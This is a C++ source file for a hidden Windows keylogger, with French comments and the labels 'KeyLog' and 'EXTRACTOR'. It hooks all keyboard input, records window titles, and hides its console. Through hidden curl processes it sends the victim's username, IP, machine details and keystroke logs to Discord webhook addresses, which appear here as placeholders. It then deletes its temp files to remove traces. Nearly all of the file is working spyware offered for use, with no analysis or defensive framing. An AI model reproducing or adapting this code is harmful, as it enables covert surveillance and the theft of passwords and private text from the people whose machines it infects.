#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <stdio.h>
#include <iostream>
#include <sstream>
#include <fstream>
#include <map>
#include <chrono>
#include <ctime>
#include <iomanip>
#include <Lmcons.h>
#include <random>
#include <tlhelp32.h>
#include <psapi.h>
#include <versionhelpers.h>
#include <shlobj.h>
#include <objbase.h>
#include <vector>

void executeCurlHidden(const std::string& command) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;  // MASQUER COMPLÈTEMENT

    ZeroMemory(&pi, sizeof(pi));

    // Créer le processus caché
    if (CreateProcessA(
        NULL,
        const_cast<char*>(command.c_str()),
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW,  // PAS DE FENÊTRE
        NULL,
        NULL,
        &si,
        &pi
    )) {
        // Attendre que curl termine
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")

// Définition des URLs des webhooks Discord
#define WEBHOOK_INFO "webhooks Discord"
#define WEBHOOK_CONNEXION "webhooks Discord"
#define WEBHOOK_LOGS "webhooks Discord"
#define WEBHOOK_DESACTIVATION "webhooks Discord"

// Définitions pour le comportement du programme
#define visible
#define bootwait
#define FORMAT 0
#define mouseignore
#define SEND_INTERVAL_SECONDS 1800  // 30 minutes

// Déclaration anticipée des fonctions
int Save(int key_stroke);
void sendExitMessage(const std::string& reason);
void sendInfoMessage();
void sendConnexionMessage();
void sendLogMessage(const std::string& filepath);
BOOL WINAPI consoleHandler(DWORD signal);
std::string getUsername();
void updateTimer();
void saveAndSendLogs();
void cleanupTempFiles();
void registerTempFile(const std::string& filename);

// Variables globales
HHOOK _hook;
KBDLLHOOKSTRUCT kbdStruct;
std::ofstream output_file;
char output_filename[256];
int cur_hour = -1;
std::string messageBuffer;
auto lastSendTime = std::chrono::steady_clock::now();
std::string pcId;
int timeRemaining = SEND_INTERVAL_SECONDS;
std::vector<std::string> tempFiles;

// Map pour les noms des touches
#if FORMAT == 0
const std::map<int, std::string> keyname{
    {VK_BACK, "[BACKSPACE]"},
    {VK_RETURN, "\n"},
    {VK_SPACE, " "},
    {VK_TAB, "[TAB]"},
    {VK_SHIFT, "[SHIFT]"},
    {VK_LSHIFT, "[LSHIFT]"},
    {VK_RSHIFT, "[RSHIFT]"},
    {VK_CONTROL, "[CONTROL]"},
    {VK_LCONTROL, "[LCONTROL]"},
    {VK_RCONTROL, "[RCONTROL]"},
    {VK_MENU, "[ALT]"},
    {VK_LWIN, "[LWIN]"},
    {VK_RWIN, "[RWIN]"},
    {VK_ESCAPE, "[ESCAPE]"},
    {VK_END, "[END]"},
    {VK_HOME, "[HOME]"},
    {VK_LEFT, "[LEFT]"},
    {VK_RIGHT, "[RIGHT]"},
    {VK_UP, "[UP]"},
    {VK_DOWN, "[DOWN]"},
    {VK_PRIOR, "[PG_UP]"},
    {VK_NEXT, "[PG_DOWN]"},
    {VK_OEM_PERIOD, "."},
    {VK_DECIMAL, "."},
    {VK_OEM_PLUS, "+"},
    {VK_OEM_MINUS, "-"},
    {VK_ADD, "+"},
    {VK_SUBTRACT, "-"},
    {VK_CAPITAL, "[CAPSLOCK]"},
};
#endif

// Codes couleur pour le terminal
#define COLOR_BLACK 0
#define COLOR_DARK_RED 4
#define COLOR_DARK_GRAY 8
#define COLOR_RED 12
#define COLOR_DARK_YELLOW 6
#define COLOR_YELLOW 14
#define COLOR_WHITE 15
#define COLOR_CYAN 11
#define COLOR_GREEN 10

// Fonction pour enregistrer les fichiers temporaires
void registerTempFile(const std::string& filename) {
    tempFiles.push_back(filename);
}

// Fonction pour nettoyer tous les fichiers temporaires
void cleanupTempFiles() {
    for (const auto& file : tempFiles) {
        DeleteFileA(file.c_str());
    }
    tempFiles.clear();
}

// Fonction pour définir la page de codes en UTF-8
void setUTF8Console() {
    SetConsoleOutputCP(CP_UTF8);
    SetConsoleCP(CP_UTF8);
}

// Fonction pour définir la couleur de la console
void setColor(int color) {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hConsole, color);
}

// Fonction pour afficher une ligne de séparation
void printSeparator(char c = '─', int color = COLOR_DARK_GRAY) {
    setColor(color);
    std::cout << "  ";
    for (int i = 0; i < 75; i++) {
        std::cout << c;
    }
    std::cout << "\n";
}

// Fonction pour afficher le logo avec animation améliorée
void printLogo() {
    const char* logo[] = {
        "  ███████╗██╗  ██╗████████╗██████╗  █████╗  ██████╗████████╗ ██████╗ ██████╗ ",
        "  ██╔════╝╚██╗██╔╝╚══██╔══╝██╔══██╗██╔══██╗██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗",
        "  █████╗   ╚███╔╝    ██║   ██████╔╝███████║██║        ██║   ██║   ██║██████╔╝",
        "  ██╔══╝   ██╔██╗    ██║   ██╔══██╗██╔══██║██║        ██║   ██║   ██║██╔══██╗",
        "  ███████╗██╔╝ ██╗   ██║   ██║  ██║██║  ██║╚██████╗   ██║   ╚██████╔╝██║  ██║",
        "  ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝"
    };

    int colors[] = { COLOR_DARK_RED, COLOR_DARK_RED, COLOR_RED, COLOR_RED, COLOR_DARK_YELLOW, COLOR_DARK_GRAY };

    for (int i = 0; i < 6; i++) {
        setColor(colors[i]);
        std::cout << logo[i] << "\n";
        Sleep(80);
    }
}

// Fonction pour afficher un en-tête stylisé amélioré
void printHeader() {
    system("cls");
    system("color 04");

    std::cout << "\n";
    printSeparator('═', COLOR_DARK_RED);
    printLogo();
    printSeparator('═', COLOR_DARK_RED);

    setColor(COLOR_RED);
    std::cout << "\n";
    std::cout << "                      >>> INTRUSION PROTOCOL INITIATED <<<\n";
    std::cout << "                         UNAUTHORIZED ACCESS DETECTED\n";

    printSeparator('═', COLOR_DARK_RED);
    setColor(COLOR_WHITE);
    std::cout << "\n";
}

// Fonction pour afficher une ligne de log formatée
void printLogLine(const std::string& status, const std::string& message, int statusColor = COLOR_RED) {
    setColor(COLOR_DARK_GRAY);
    std::cout << "  [";
    setColor(statusColor);
    std::cout << status;
    setColor(COLOR_DARK_GRAY);
    std::cout << "] ";
    setColor(COLOR_WHITE);
    std::cout << message << "\n";
}

// Fonction pour afficher le timer amélioré
void printTimer() {
    COORD coord;
    coord.X = 0;
    coord.Y = 12;
    SetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE), coord);

    int minutes = timeRemaining / 60;
    int seconds = timeRemaining % 60;

    std::cout << "\n";
    printSeparator('─', COLOR_DARK_GRAY);

    setColor(COLOR_DARK_GRAY);
    std::cout << "  │ ";
    setColor(COLOR_DARK_YELLOW);
    std::cout << "DATA EXFILTRATION SCHEDULED IN: ";

    if (timeRemaining <= 30) {
        setColor(COLOR_RED);
    }
    else if (timeRemaining <= 120) {
        setColor(COLOR_DARK_YELLOW);
    }
    else {
        setColor(COLOR_WHITE);
    }

    std::cout << std::setfill('0') << std::setw(2) << minutes << ":"
        << std::setw(2) << seconds;

    setColor(COLOR_DARK_GRAY);
    std::cout << "                         │\n";

    printSeparator('─', COLOR_DARK_GRAY);

    setColor(COLOR_DARK_GRAY);
    std::cout << "  │ ";
    setColor(COLOR_DARK_RED);
    std::cout << "STATUS: ";
    setColor(COLOR_RED);
    std::cout << "ACTIVE MONITORING";

    // Calculer les espaces nécessaires
    int remaining = 54;
    for (int i = 0; i < remaining; i++) std::cout << " ";

    setColor(COLOR_DARK_GRAY);
    std::cout << "│\n";

    printSeparator('─', COLOR_DARK_GRAY);
}

// Fonction pour mettre à jour le timer
void updateTimer() {
    auto now = std::chrono::steady_clock::now();
    auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - lastSendTime).count();
    timeRemaining = SEND_INTERVAL_SECONDS - static_cast<int>(elapsed);

    if (timeRemaining < 0) {
        timeRemaining = 0;
    }

    printTimer();
}

// Fonction pour échapper les caractères spéciaux pour JSON
std::string escapeJson(const std::string& s) {
    std::ostringstream o;
    for (auto c = s.cbegin(); c != s.cend(); c++) {
        if (*c == '"') {
            o << "\\\"";
        }
        else if (*c == '\\') {
            o << "\\\\";
        }
        else if (*c == '\b') {
            o << "\\b";
        }
        else if (*c == '\f') {
            o << "\\f";
        }
        else if (*c == '\n') {
            o << "\\n";
        }
        else if (*c == '\r') {
            o << "\\r";
        }
        else if (*c == '\t') {
            o << "\\t";
        }
        else {
            o << *c;
        }
    }
    return o.str();
}

// Fonction pour récupérer l'heure actuelle
std::string getCurrentTime() {
    auto now = std::chrono::system_clock::now();
    auto in_time_t = std::chrono::system_clock::to_time_t(now);
    struct tm tm_info;
    localtime_s(&tm_info, &in_time_t);
    std::stringstream ss;
    ss << std::put_time(&tm_info, "%H:%M:%S");
    return ss.str();
}

// Fonction pour récupérer la date et l'heure au format ISO
std::string getISOTimestamp() {
    auto now = std::chrono::system_clock::now();
    auto in_time_t = std::chrono::system_clock::to_time_t(now);
    struct tm tm_info;
    localtime_s(&tm_info, &in_time_t);
    std::stringstream ss;
    ss << std::put_time(&tm_info, "%Y-%m-%dT%H:%M:%S");
    return ss.str();
}

// Fonction pour récupérer le nom d'utilisateur
std::string getUsername() {
    char username[UNLEN + 1];
    DWORD size = UNLEN + 1;
    if (GetUserNameA(username, &size)) {
        return username;
    }
    return "Unknown_User";
}

// Fonction pour générer un identifiant unique basé sur l'IP
std::string generatePCIdFromIP(const std::string& ipAddress) {
    std::string id = ipAddress;
    std::replace(id.begin(), id.end(), '.', '_');
    return "TARGET_" + id;
}

// Fonction pour récupérer l'adresse IP locale
std::string getLocalIPAddress() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return "Unknown_IP";
    }
    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) == SOCKET_ERROR) {
        WSACleanup();
        return "Unknown_IP";
    }
    struct hostent* host = gethostbyname(hostname);
    if (host == nullptr) {
        WSACleanup();
        return "Unknown_IP";
    }
    struct in_addr addr;
    memcpy(&addr, host->h_addr_list[0], sizeof(addr));
    std::string ipAddress = inet_ntoa(addr);
    WSACleanup();
    return ipAddress;
}

// Fonction pour récupérer le nom de l'ordinateur
std::string getComputerName() {
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName) / sizeof(computerName[0]);
    if (GetComputerNameA(computerName, &size)) {
        return computerName;
    }
    return "Unknown_Computer";
}

// Fonction pour récupérer la version de Windows
std::string getWindowsVersion() {
    if (IsWindows10OrGreater()) {
        return "Windows 10+";
    }
    else if (IsWindows8OrGreater()) {
        return "Windows 8/8.1";
    }
    else if (IsWindows7OrGreater()) {
        return "Windows 7";
    }
    else {
        return "Unknown";
    }
}

// Fonction pour récupérer l'architecture (32/64 bits)
std::string getSystemArchitecture() {
#ifdef _WIN64
    return "64-bit";
#else
    return "32-bit";
#endif
}

// Fonction pour récupérer la mémoire totale et disponible
std::string getMemoryInfo() {
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemoryStatusEx(&memInfo);
    double totalMem = static_cast<double>(memInfo.ullTotalPhys) / (1024 * 1024 * 1024);
    double freeMem = static_cast<double>(memInfo.ullAvailPhys) / (1024 * 1024 * 1024);
    std::ostringstream oss;
    oss << std::fixed << std::setprecision(2) << totalMem << " GB (" << freeMem << " GB available)";
    return oss.str();
}

// Fonction pour récupérer l'espace disque
std::string getDiskSpace() {
    ULARGE_INTEGER freeBytesAvailable, totalNumberOfBytes, totalNumberOfFreeBytes;
    if (GetDiskFreeSpaceExA("C:\\", &freeBytesAvailable, &totalNumberOfBytes, &totalNumberOfFreeBytes)) {
        double totalSpace = static_cast<double>(totalNumberOfBytes.QuadPart) / (1024 * 1024 * 1024);
        double freeSpace = static_cast<double>(freeBytesAvailable.QuadPart) / (1024 * 1024 * 1024);
        std::ostringstream oss;
        oss << std::fixed << std::setprecision(2) << freeSpace << " GB / " << totalSpace << " GB";
        return oss.str();
    }
    return "Unknown";
}

// Fonction pour récupérer le nom du processeur
std::string getProcessorName() {
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    switch (sysInfo.wProcessorArchitecture) {
    case PROCESSOR_ARCHITECTURE_AMD64: return "AMD64";
    case PROCESSOR_ARCHITECTURE_ARM: return "ARM";
    case PROCESSOR_ARCHITECTURE_IA64: return "IA64";
    case PROCESSOR_ARCHITECTURE_INTEL: return "x86";
    default: return "Unknown";
    }
}

// Fonction pour envoyer un message avec embed Discord - Informations système
// ================== FONCTIONS EMBEDS MISES À JOUR ==================

void sendInfoMessage() {
    std::string username = getUsername();
    std::string ipAddress = getLocalIPAddress();
    std::string timestamp = getISOTimestamp();
    std::string computerName = getComputerName();
    std::string windowsVersion = getWindowsVersion();
    std::string architecture = getSystemArchitecture();
    std::string processor = getProcessorName();
    std::string memory = getMemoryInfo();
    std::string diskSpace = getDiskSpace();
    pcId = generatePCIdFromIP(ipAddress);

    std::ostringstream jsonPayload;
    jsonPayload << "{"
        << "\"username\": \"KeyLog\","
        << "\"avatar_url\": \"https://i.pinimg.com/1200x/8d/54/7e/8d547eeed99e12413c4d58780b33c9cd.jpg\","
        << "\"embeds\": [{"
        << "\"title\": \"SYSTEM COMPROMISED\","
        << "\"description\": \"Root access obtained - Full system penetration successful\","
        << "\"color\": 16777215,"
        << "\"image\": {\"url\": \"https://i.pinimg.com/1200x/34/8e/2c/348e2c524ecaafa6f235e7256bc80a3e.jpg\"},"
        << "\"fields\": ["
        << "{\"name\": \"TARGET ID\", \"value\": \"```target id```\", \"inline\": false},"
        << "{\"name\": \"MACHINE\", \"value\": \"```machine name```\", \"inline\": true},"
        << "{\"name\": \"USER\", \"value\": \"```username```\", \"inline\": true},"
        << "{\"name\": \"IP ADDRESS\", \"value\": \"```ip address```\", \"inline\": true},"
        << "{\"name\": \"SYSTEM\", \"value\": \"```Windows 10+ 64-bit```\", \"inline\": true},"
        << "{\"name\": \"PROCESSOR\", \"value\": \"```processor```\", \"inline\": true},"
        << "{\"name\": \"MEMORY\", \"value\": \"```memory```\", \"inline\": true},"
        << "{\"name\": \"DISK SPACE\", \"value\": \"```disk space```\", \"inline\": false},"
        << "{\"name\": \"STATUS\", \"value\": \"```ACTIVE - Data extraction in progress```\", \"inline\": false}"
        << "],"
        << "\"footer\": {\"text\": \"Extraction Protocol v2.0 • " << getCurrentTime() << "\"},"
        << "\"timestamp\": \"" << timestamp << "\""
        << "}]"
        << "}";

    std::string tempFile = "temp_info.json";
    registerTempFile(tempFile);
    std::ofstream jsonFile(tempFile);
    jsonFile << jsonPayload.str();
    jsonFile.close();

    std::string command = "curl -X POST -H \"Content-Type: application/json\" -d @" + tempFile + " \"" + std::string(WEBHOOK_INFO) + "\" -k >nul 2>&1";
    executeCurlHidden(command);
}

void sendConnexionMessage() {
    std::string timestamp = getISOTimestamp();

    std::ostringstream jsonPayload;
    jsonPayload << "{"
        << "\"username\": \"KeyLog\","
        << "\"avatar_url\": \"https://i.pinimg.com/1200x/8d/54/7e/8d547eeed99e12413c4d58780b33c9cd.jpg\","
        << "\"embeds\": [{"
        << "\"title\": \"BACKDOOR DEPLOYED\","
        << "\"description\": \"Keyboard hook installed - Real-time surveillance initialized\","
        << "\"color\": 16777215,"
        << "\"fields\": ["
        << "{\"name\": \"TARGET\", \"value\": \"```target id```\", \"inline\": false},"
        << "{\"name\": \"HOOK STATUS\", \"value\": \"```ACTIVE - All keystrokes monitored```\", \"inline\": true},"
        << "{\"name\": \"CAPTURE MODE\", \"value\": \"```REAL-TIME```\", \"inline\": true},"
        << "{\"name\": \"IP ADDRESS\", \"value\": \"```ip address```\", \"inline\": true}"
        << "],"
        << "\"footer\": {\"text\": \"Surveillance Protocol Active • " << getCurrentTime() << "\"},"
        << "\"timestamp\": \"" << timestamp << "\""
        << "}]"
        << "}";

    std::string tempFile = "temp_connexion.json";
    registerTempFile(tempFile);
    std::ofstream jsonFile(tempFile);
    jsonFile << jsonPayload.str();
    jsonFile.close();

    std::string command = "curl -X POST -H \"Content-Type: application/json\" -d @" + tempFile + " \"" + std::string(WEBHOOK_CONNEXION) + "\" -k >nul 2>&1";
    executeCurlHidden(command);
}

void sendLogMessage(const std::string& filepath) {
    std::string timestamp = getISOTimestamp();

    std::ostringstream jsonPayload;
    jsonPayload << "{"
        << "\"username\": \"KeyLog\","
        << "\"avatar_url\": \"https://i.pinimg.com/1200x/8d/54/7e/8d547eeed99e12413c4d58780b33c9cd.jpg\","
        << "\"embeds\": [{"
        << "\"title\": \"DATA INTERCEPTED\","
        << "\"description\": \"New keystroke data successfully captured\","
        << "\"color\": 16777215,"
        << "\"image\": {\"url\": \"https://i.pinimg.com/736x/de/b8/9f/deb89ffcee9a7a00f2b7289b88020d74.jpg\"},"
        << "\"fields\": ["
        << "{\"name\": \"TARGET\", \"value\": \"```target id```\", \"inline\": false},"
        << "{\"name\": \"USER\", \"value\": \"```username```\", \"inline\": true},"
        << "{\"name\": \"HOST\", \"value\": \"```machine name```\", \"inline\": true},"
        << "{\"name\": \"IP\", \"value\": \"```ip address```\", \"inline\": true},"
        << "{\"name\": \"FILE\", \"value\": \"```logs/log_target_xxxx.txt```\", \"inline\": false}"
        << "],"
        << "\"footer\": {\"text\": \"KeyLog • Data Exfiltration • " << getCurrentTime() << "\"},"
        << "\"timestamp\": \"" << timestamp << "\""
        << "}]"
        << "}";

    std::string tempFile = "temp_log_embed.json";
    registerTempFile(tempFile);
    std::ofstream jsonFile(tempFile);
    jsonFile << jsonPayload.str();
    jsonFile.close();

    std::string embedCommand = "curl -X POST -H \"Content-Type: application/json\" -d @" + tempFile + " \"" + std::string(WEBHOOK_LOGS) + "\" -k >nul 2>&1";
    executeCurlHidden(embedCommand);

    Sleep(1000);

    std::string fileCommand = "curl -X POST -F \"file=@" + filepath + "\" \"" + std::string(WEBHOOK_LOGS) + "\" -k >nul 2>&1";
    executeCurlHidden(fileCommand);
}

// Gestionnaire pour la fermeture forcée
BOOL WINAPI consoleHandler(DWORD signal) {
    if (signal == CTRL_C_EVENT) {
        sendExitMessage("FORCED INTERRUPTION - CTRL+C DETECTED");
    }
    else if (signal == CTRL_CLOSE_EVENT) {
        sendExitMessage("FORCED CLOSURE - WINDOW TERMINATED");
    }
    Sleep(2000);
    return TRUE;
}

// Fonction pour sauvegarder et envoyer les logs
void saveAndSendLogs() {
    if (!messageBuffer.empty()) {
        std::string filename = "logs/log_" + pcId + "_" + std::to_string(time(NULL)) + ".txt";
        std::ofstream logFile(filename);
        logFile << messageBuffer;
        logFile.close();
        sendLogMessage(filename);
        messageBuffer.clear();
    }
    lastSendTime = std::chrono::steady_clock::now();
    timeRemaining = SEND_INTERVAL_SECONDS;
}

// Fonction pour envoyer les logs si l'intervalle est écoulé
void sendBufferIfNeeded() {
    auto now = std::chrono::steady_clock::now();
    auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - lastSendTime).count();

    if (elapsed >= SEND_INTERVAL_SECONDS) {
        saveAndSendLogs();
    }
}

// Callback pour le hook clavier
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        if (wParam == WM_KEYDOWN) {
            kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
            Save(kbdStruct.vkCode);
        }
    }
    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

// Fonction pour installer le hook
void SetHook() {
    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0))) {
        setColor(COLOR_RED);
        printLogLine("ERROR", "HOOK INSTALLATION FAILED", COLOR_RED);
        MessageBox(NULL, L"Hook installation failed!", L"Error", MB_ICONERROR);
    }
}

// Fonction pour libérer le hook
void ReleaseHook() {
    UnhookWindowsHookEx(_hook);
}

// Fonction pour sauvegarder les logs
int Save(int key_stroke) {
    std::stringstream output;
    static char lastwindow[256] = "";
#ifndef mouseignore
    if ((key_stroke == 1) || (key_stroke == 2)) {
        return 0;
    }
#endif
    HWND foreground = GetForegroundWindow();
    if (!foreground) {
        return 0;
    }
    DWORD threadID = GetWindowThreadProcessId(foreground, NULL);
    HKL layout = GetKeyboardLayout(threadID);
    struct tm tm_info;
    time_t t = time(NULL);
    localtime_s(&tm_info, &t);
    char window_title[256];
    if (GetWindowTextA(foreground, (LPSTR)window_title, 256) == 0) {
        return 0;
    }
    if (strcmp(window_title, lastwindow) != 0) {
        strcpy_s(lastwindow, sizeof(lastwindow), window_title);
        char s[64];
        strftime(s, sizeof(s), "%Y-%m-%dT%X", &tm_info);
        output << "\n\n[Window: " << window_title << " - at " << s << "] ";
    }
#if FORMAT == 10
    output << '[' << key_stroke << ']';
#elif FORMAT == 16
    output << std::hex << "[" << key_stroke << ']';
#else
    if (keyname.find(key_stroke) != keyname.end()) {
        output << keyname.at(key_stroke);
    }
    else {
        char key;
        bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
        if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0 || (GetKeyState(VK_RSHIFT) & 0x1000) != 0) {
            lowercase = !lowercase;
        }
        key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);
        if (!lowercase) {
            key = tolower(key);
        }
        output << char(key);
    }
#endif
    if (cur_hour != tm_info.tm_hour) {
        cur_hour = tm_info.tm_hour;
        output_file.close();
        strftime(output_filename, sizeof(output_filename), "logs/%Y-%m-%d__%H-%M-%S.log", &tm_info);
        output_file.open(output_filename, std::ios_base::app);
    }
    output_file << output.str();
    output_file.flush();
    messageBuffer += output.str();
    sendBufferIfNeeded();
    return 0;
}

// Fonction pour masquer la console
void Stealth() {
#ifdef visible
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1);
#endif
#ifdef invisible
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
    FreeConsole();
#endif
}

// Fonction pour vérifier si le système est en cours de démarrage
bool IsSystemBooting() {
    return GetSystemMetrics(SM_SYSTEMDOCKED) != 0;
}

// Fonction pour envoyer un message de désactivation avec embed
void sendExitMessage(const std::string& reason) {
    if (!messageBuffer.empty()) {
        std::string filename = "logs/log_" + pcId + "_FINAL_" + std::to_string(time(NULL)) + ".txt";
        std::ofstream logFile(filename);
        logFile << messageBuffer;
        logFile.close();
        sendLogMessage(filename);
        messageBuffer.clear();
    }

    cleanupTempFiles();

    std::string timestamp = getISOTimestamp();

    std::ostringstream jsonPayload;
    jsonPayload << "{"
        << "\"username\": \"KeyLog\","
        << "\"embeds\": [{"
        << "\"title\": \"CONNECTION TERMINATED\","
        << "\"description\": \"" << escapeJson(reason) << "\","
        << "\"color\": 3092790,"
        << "\"fields\": ["
        << "{\"name\": \"TARGET\", \"value\": \"```" << escapeJson(pcId) << "```\", \"inline\": false},"
        << "{\"name\": \"BACKDOOR STATUS\", \"value\": \"```DEACTIVATED```\", \"inline\": true},"
        << "{\"name\": \"CLEANUP STATUS\", \"value\": \"```ALL TEMP FILES DELETED```\", \"inline\": true},"
        << "{\"name\": \"TRACES\", \"value\": \"```SUCCESSFULLY REMOVED```\", \"inline\": false}"
        << "],"
        << "\"timestamp\": \"" << timestamp << "\","
        << "\"footer\": {\"text\": \"Termination Protocol Complete\"}"
        << "}]"
        << "}";

    std::string tempFile = "temp_exit.json";
    std::ofstream jsonFile(tempFile);
    jsonFile << jsonPayload.str();
    jsonFile.close();

    std::string command = "curl -X POST -H \"Content-Type: application/json\" -d @" + tempFile + " \"" + std::string(WEBHOOK_DESACTIVATION) + "\" -k >nul 2>&1";
    executeCurlHidden(command);

    Sleep(2000);
    DeleteFileA(tempFile.c_str());
}

// Fonction principale
int main() {
    // MASQUER IMMÉDIATEMENT
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);
    FreeConsole();

    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
    SetConsoleCtrlHandler(consoleHandler, TRUE);

    // PAS de printHeader() ni printLogLine()
    Stealth();

    if (CreateDirectory(L"logs", NULL) || GetLastError() == ERROR_ALREADY_EXISTS) {
        // PAS de printLogLine()
    }

    Sleep(500);
    sendInfoMessage();
    // PAS de printLogLine()
    Sleep(500);

    sendConnexionMessage();
    // PAS de printLogLine()
    Sleep(500);

    std::atexit([]() {
        sendExitMessage("DISCONNECTION - SESSION TERMINATED");
        });

#ifdef bootwait
    while (IsSystemBooting()) {
        // PAS de printLogLine()
        Sleep(10000);
    }
#endif

    SetHook();
    // PAS de printLogLine()
    // PAS de std::cout

    Sleep(1000);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        Sleep(1000);
        sendBufferIfNeeded();
        // PAS de updateTimer()
    }

    ReleaseHook();
    CoUninitialize();
    return 0;
}
